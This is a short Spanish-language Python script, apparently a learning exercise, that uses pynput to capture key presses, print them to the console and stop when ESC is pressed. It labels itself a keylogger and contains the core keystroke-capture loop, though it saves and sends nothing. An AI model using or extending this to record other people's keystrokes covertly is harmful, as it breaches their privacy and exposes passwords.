from pynput.keyboard import Listener, Key

def mostrar_teclas(key):

    

    try:
        tecla = key.char
    except AttributeError:
        if key == key.space:
            tecla = "ESPACIO"
        elif key == key.enter:
            tecla = "ENTER"
        elif key == key.esc:
            print("Keylogger detenido.")
            return False
        else:
            tecla = str(key)
    print(f"Tecla presionada: {tecla}")

print("Keylogger en ejecucuión... Presione ESC para detener.sahola")

with Listener(on_press=mostrar_teclas) as listener:
    listener.join()

# comentario